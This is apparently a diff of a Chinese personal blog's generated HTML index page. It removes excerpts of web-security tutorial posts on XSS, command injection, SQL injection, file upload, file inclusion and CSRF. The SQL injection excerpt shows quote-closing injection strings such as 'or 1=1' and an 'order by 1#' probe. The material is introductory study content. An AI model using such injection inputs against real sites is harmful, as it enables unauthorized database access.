-          <a class="article-more-a" href="/2021/08/04/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">web安全的杂杂恋</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/04/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-xss" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/12/xss/">XSS</a>
-    </h1>
-  
-
-        
-        <a href="/2021/07/12/xss/" class="archive-article-date">
-  	<time datetime="2021-07-12T03:37:34.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-12</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="什么是XSS跨站点脚本攻击"><a href="#什么是XSS跨站点脚本攻击" class="headerlink" title="什么是XSS跨站点脚本攻击"></a>什么是XSS跨站点脚本攻击</h1><p>攻击者在被攻击的web服务器网页中嵌入恶意脚本，通常使用js编写的恶意代码，当用户使用浏览器访问被嵌入恶意代码的网页时，恶意代码将会在用户的浏览器上执行。XSS其实也是注入的一种，前端注入。（用户输入的传参会被当作前端代码执行）</p>
-<p>前端代码:HTML+CSS+JS</p>
-<p>XSS属于针对客户端的攻击，受害者最终是用户。</p>
-<p>网站管理人员也属于用户之一，攻击者可以通过XSS假冒管理员身份对网站实施攻击。</p>
-<p>如果我们想要进入管理员后台</p>
-<ol>
-<li>通过后台地址，输入正确的账号。</li>
-<li>通过cookie（获得了管理员用户的权限）不用管理员账号密码进入后台。(这就是利用了XSS)</li>
-</ol>
-<h1 id="XSS攻击的危害"><a href="#XSS攻击的危害" class="headerlink" title="XSS攻击的危害"></a>XSS攻击的危害</h1><ol>
-<li><p>盗取用户cookie</p>
-</li>
-<li><p>修改网页内容</p>
-</li>
-<li><p>网站挂马</p>
-</li>
-<li><p>利用网站重定向</p>
-</li>
-<li><p>XSS蠕虫</p>
-</li>
-</ol>
-        
-          <a class="article-more-a" href="/2021/07/12/xss/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">web安全的杂杂恋</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/07/12/xss/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-命令注入漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/12/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">命令注入漏洞</a>
-    </h1>
-  
-
-        
-        <a href="/2021/07/12/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="archive-article-date">
-  	<time datetime="2021-07-12T01:42:57.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-12</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="漏洞产生原因："><a href="#漏洞产生原因：" class="headerlink" title="漏洞产生原因："></a>漏洞产生原因：</h2><p>在web程序中，有些功能需求web前端传递参数到后台服务器上执行（特别是一些网络设备的web管理界面，如路由器，交换机等），但由于开发人员没有对输入进行严格的过滤，导致了攻击者可以构造一些额外的“带有非法目的”（比如建立用户账户，越权等）命令，欺骗后台服务器执行。</p>
-<h2 id="漏洞危害："><a href="#漏洞危害：" class="headerlink" title="漏洞危害："></a>漏洞危害：</h2><p>如果Web应用使用的是root权限，则该漏洞可以导致攻击者在服务器上执行任意命令。</p>
-        
-          <a class="article-more-a" href="/2021/07/12/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">web安全的杂杂恋</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/07/12/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-SQL注入" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/11/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a>
-    </h1>
-  
-
-        
-        <a href="/2021/07/11/SQL%E6%B3%A8%E5%85%A5/" class="archive-article-date">
-  	<time datetime="2021-07-11T08:20:30.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-11</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="SQL注入本质"><a href="#SQL注入本质" class="headerlink" title="SQL注入本质"></a>SQL注入本质</h1><p>注入攻击的本质，是把用户输入的数据当作代码执行。</p>
-<p>这里有两个关键条件：</p>
-<ol>
-<li>第一个是用户能够控制输入</li>
-<li>第二个是原本程序要执行的代码，拼接了用户输入的数据然后进行执行</li>
-</ol>
-<h2 id="SQL注入分类"><a href="#SQL注入分类" class="headerlink" title="SQL注入分类"></a>SQL注入分类</h2><p>数字型注入</p>
-<p>SELECT first_name,last_name FROM users WHERE user_id=$id</p>
-<p>字符型注入</p>
-<p>SELECT first_name,last_name FROM users WHERE user_id=’$id’</p>
-<p>无论何种类型，都可以通过直接输入单引号来判断是否存在注入点。可以分别输入3和1+2，根据显示结果来判断数据类型。</p>
-<p>如果是数字型，则会做运算，如果没做，则反之。</p>
-<p>字符型注入最关键的是如何闭合SQL语句以及注释多余的代码。</p>
-<p>SELECT first_name,last_name FROM users WHERE user_id=’ ‘or 1=1 or’ ‘</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT first_name, last_name FROM users WHERE user_id = &#x27;1&#x27; order by 1#`;(按照Mysql语法，#后面会被注释掉，使用这种方法屏蔽掉后面的单引号，避免语法错误)</span><br></pre></td></tr></table></figure>
-
-<p>order by 用于对结果集按照一个列或者多个列进行排序(默认是升序)</p>
-        
-          <a class="article-more-a" href="/2021/07/11/SQL%E6%B3%A8%E5%85%A5/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">web安全的杂杂恋</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/07/11/SQL%E6%B3%A8%E5%85%A5/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-文件上传漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">文件上传与解析漏洞</a>
-    </h1>
-  
-
-        
-        <a href="/2021/07/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="archive-article-date">
-  	<time datetime="2021-07-11T07:39:30.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-11</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h1><p>很多web站点都有文件上传的接口(比如注册时上传头像等)由于没有对上传的文件类型进行严格限制，导致攻击者可以上传一些恶意文件（比如Webshell）。</p>
-<p>文件上传的本质是为了让上传的文件可以任意代码执行，达到对目标的控制。（Getshell）</p>
-        
-          <a class="article-more-a" href="/2021/07/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">web安全的杂杂恋</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/07/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-文件包含漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/11/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">文件包含漏洞</a>
-    </h1>
-  
-
-        
-        <a href="/2021/07/11/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" class="archive-article-date">
-  	<time datetime="2021-07-11T02:38:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-11</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>程序开发人员通常会把可重复使用的函数写入到单个文件中，在使用某些函数时，直接调用此文件，而无需再次编写，这种调用文件的过程称为包含。相同代码重复出现在不同文件中出现代码冗余，所以出现了文件包含函数，就是让代码更为高效，需要用到的部分会去调用，且被包含的文件会被当作php代码执行（文件里面的东西是必须当作代码执行，文件包含，只要包含了，不管任何后缀，都会当作php代码执行）。</p>
-<p>有时候用于网站功能需求，会让前端用户选择要包含的文件，而开发人员又没有对要包含的文件进行安全考虑，就会导致攻击者可以通过修改文件的位置来让后台执行任意文件，从而导致文件包含漏洞。</p>
-        
-          <a class="article-more-a" href="/2021/07/11/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">web安全的杂杂恋</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/07/11/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-CSRF跨站点请求伪造" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/11/CSRF%E8%B7%A8%E7%AB%99%E7%82%B9%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/">CSRF跨站点请求伪造</a>
-    </h1>
-  
-
-        
-        <a href="/2021/07/11/CSRF%E8%B7%A8%E7%AB%99%E7%82%B9%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/" class="archive-article-date">
-  	<time datetime="2021-07-11T02:07:09.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-11</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="什么是CSRF"><a href="#什么是CSRF" class="headerlink" title="什么是CSRF"></a>什么是CSRF</h1><p>CSRF跨站请求伪造，也被称为“One Click Attack”，通常缩写为CSRF，是一种对网站的恶意利用。它与XSS不同，XSS利用站点内的新人用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。</p>
-<p>它的成因是因为网站的Cookie在浏览器中不会过期，只要不关闭浏览器或者退出登录，那以后只要是访问这个网站，就会默认你已经登录的状态。而在这个期间，攻击者发送了构造好的CSRF脚本或者包含CSRF脚本的链接，可能会执行一些用户不想做的功能。</p>
-<p>攻击特点：攻击者盗用用户的身份，以用户的名义进行某些非法操作。</p>
-<p>tips:业内对需要交互的漏洞不重视。</p>
-        
-          <a class="article-more-a" href="/2021/07/11/CSRF%E8%B7%A8%E7%AB%99%E7%82%B9%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">web安全的杂杂恋</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/07/11/CSRF%E8%B7%A8%E7%AB%99%E7%82%B9%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
   
   
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/page/6/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><span class="page-number current">7</span>
-    </nav>
+  
+
+  
+
+  
+
   
 
 
@@ -914,8 +422,8 @@
     <script>
 	var yiliaConfig = {
 		mathjax: true,
-		isHome: true,
-		isPost: false,
+		isHome: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
